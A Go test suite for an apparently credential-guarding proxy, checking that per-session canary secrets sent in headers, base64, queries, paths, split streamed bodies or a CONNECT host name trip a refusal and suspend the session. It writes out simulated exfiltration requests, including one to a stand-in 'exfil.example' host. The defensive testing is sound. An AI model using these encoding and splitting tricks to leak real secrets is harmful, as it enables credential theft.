package placeholder

import (
	"encoding/base64"
	"io"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/keylatch/keylatch/internal/audit"
)

func canaryValue(h *harness) string {
	for _, v := range h.sess.Canaries() {
		return v
	}
	return ""
}

func TestEachSessionGetsItsOwnCanary(t *testing.T) {
	a, b := newHarness(t), newHarness(t)
	ca, cb := a.sess.Canaries(), b.sess.Canaries()
	if len(ca) != 1 || len(cb) != 1 {
		t.Fatalf("canaries: %v %v", ca, cb)
	}
	for name, v := range ca {
		if name != "KEYLATCH_CANARY_STRIPE" || !strings.HasPrefix(v, "klc-canary-stripe-") {
			t.Errorf("canary %s=%s", name, v)
		}
		if cb[name] == v {
			t.Error("two sessions share a canary")
		}
	}
}

func TestCanaryInARequestTripsAndSuspendsTheSessionWithinOneRequest(t *testing.T) {
	cases := []struct {
		name  string
		where string
		send  func(h *harness, c *http.Client, canary string) (*http.Response, string)
	}{
		{"header", "header:x-debug", func(h *harness, c *http.Client, canary string) (*http.Response, string) {
			return h.do(c, "GET", "https://api.stripe.com/v1/x", nil, map[string]string{"Authorization": "Bearer " + h.placeholder(), "X-Debug": canary})
		}},
		{"base64 in a header", "header:x-blob", func(h *harness, c *http.Client, canary string) (*http.Response, string) {
			return h.do(c, "GET", "https://api.stripe.com/v1/x", nil, map[string]string{"X-Blob": base64.StdEncoding.EncodeToString([]byte("user:" + canary))})
		}},
		{"query", "query", func(h *harness, c *http.Client, canary string) (*http.Response, string) {
			return h.do(c, "GET", "https://files.stripe.com/v1/x?note="+canary, nil, nil)
		}},
		{"percent-encoded query", "query", func(h *harness, c *http.Client, canary string) (*http.Response, string) {
			return h.do(c, "GET", "https://files.stripe.com/v1/x?note="+strings.ReplaceAll(canary, "-", "%2D"), nil, nil)
		}},
		{"path", "path", func(h *harness, c *http.Client, canary string) (*http.Response, string) {
			return h.do(c, "GET", "https://api.stripe.com/v1/"+canary, nil, nil)
		}},
		{"body", "body", func(h *harness, c *http.Client, canary string) (*http.Response, string) {
			return h.do(c, "POST", "https://api.stripe.com/v1/x", strings.NewReader(`{"leak":"`+canary+`"}`), map[string]string{"Authorization": "Bearer " + h.placeholder()})
		}},
		{"streamed body split across reads", "body", func(h *harness, c *http.Client, canary string) (*http.Response, string) {
			pr, pw := io.Pipe()
			go func() {
				_, _ = pw.Write([]byte(strings.Repeat("z", 2<<20) + canary[:10]))
				time.Sleep(50 * time.Millisecond)
				_, _ = pw.Write([]byte(canary[10:]))
				_ = pw.Close()
			}()
			return h.do(c, "POST", "https://api.stripe.com/v1/x", pr, map[string]string{"Authorization": "Bearer " + h.placeholder()})
		}},
	}
	for _, http2 := range []bool{false, true} {
		for _, tc := range cases {
			name := tc.name + "/http1"
			if http2 {
				name = tc.name + "/http2"
			}
			t.Run(name, func(t *testing.T) {
				h := newHarness(t)
				canary := canaryValue(h)
				c := h.client(http2)
				resp, body := tc.send(h, c, canary)
				if resp.StatusCode != http.StatusForbidden || !strings.Contains(body, "canary_tripped") {
					t.Fatalf("got %d %q, want a canary refusal", resp.StatusCode, body)
				}
				for _, r := range h.up.requests() {
					// A streamed body may have sent its first bytes before the
					// rest completed the canary; the whole value never arrives.
					if strings.Contains(string(r.Body)+r.RawQuery+r.Path+r.Header.Get("X-Debug")+r.Header.Get("X-Blob"), canary) {
						t.Fatalf("a canary reached the upstream: %+v", r)
					}
				}
				ev := h.audit.actions(audit.ActionCanaryTripped)
				if len(ev) != 1 {
					t.Fatalf("canary.tripped events: %d", len(ev))
				}
				if got := ev[0].Extra["where"]; got != tc.where {
					t.Errorf("where = %v, want %v", got, tc.where)
				}
				if ev[0].Extra["host"] == "" || ev[0].Extra["connection"] != "stripe" {
					t.Errorf("event %v", ev[0].Extra)
				}
				if !h.sess.Suspended() {
					t.Error("the session was not suspended by the first request")
				}
				if strings.Contains(h.audit.dump(), canary) {
					t.Error("the audit log holds the canary")
				}
				if len(h.audit.actions(audit.ActionPlaceholderMisuse)) != 0 {
					t.Error("a canary was reported as a placeholder misuse")
				}
				time.Sleep(400 * time.Millisecond)
				req, _ := http.NewRequest("GET", "https://api.stripe.com/v1/balance", nil)
				req.Header.Set("Authorization", "Bearer "+h.placeholder())
				if resp2, err := h.client(http2).Do(req); err == nil {
					defer func() { _ = resp2.Body.Close() }()
					if resp2.StatusCode == 200 {
						t.Error("a suspended session still substituted")
					}
				}
			})
		}
	}
}

func TestCanaryInAConnectTargetTrips(t *testing.T) {
	h := newHarness(t)
	canary := canaryValue(h)
	c, err := h.dialProxy()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = c.Close() }()
	_, _ = io.WriteString(c, "CONNECT "+canary+".exfil.example:443 HTTP/1.1\r\nHost: x\r\n\r\n")
	out, _ := io.ReadAll(c)
	if !strings.Contains(string(out), "canary_tripped") {
		t.Fatalf("response %q", out)
	}
	if ev := h.audit.actions(audit.ActionCanaryTripped); len(ev) != 1 || ev[0].Extra["where"] != "connect_target" {
		t.Fatalf("events %v", ev)
	}
	if !h.sess.Suspended() {
		t.Error("not suspended")
	}
	if strings.Contains(h.audit.dump(), canary) {
		t.Error("the audit log holds the canary that was the host name")
	}
}

func TestCanaryInAPlainRequestTrips(t *testing.T) {
	h := newHarness(t)
	canary := canaryValue(h)
	c, err := h.dialProxy()
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = c.Close() }()
	_, _ = io.WriteString(c, "GET http://api.stripe.com/x?k="+canary+" HTTP/1.1\r\nHost: api.stripe.com\r\n\r\n")
	out, _ := io.ReadAll(c)
	if !strings.Contains(string(out), "canary_tripped") {
		t.Fatalf("response %q", out)
	}
	h2 := newHarness(t)
	canary2 := canaryValue(h2)
	c2, _ := h2.dialProxy()
	defer func() { _ = c2.Close() }()
	body := `{"k":"` + canary2 + `"}`
	_, _ = io.WriteString(c2, "POST http://api.stripe.com/x HTTP/1.1\r\nHost: api.stripe.com\r\nContent-Length: "+itoa(len(body))+"\r\n\r\n"+body)
	out2, _ := io.ReadAll(c2)
	if !strings.Contains(string(out2), "canary_tripped") {
		t.Fatalf("response %q", out2)
	}
	if ev := h2.audit.actions(audit.ActionCanaryTripped); len(ev) != 1 || ev[0].Extra["where"] != "plain_http_body" {
		t.Fatalf("events %v", ev)
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for ; n > 0; n /= 10 {
		b = append([]byte{byte('0' + n%10)}, b...)
	}
	return string(b)
}
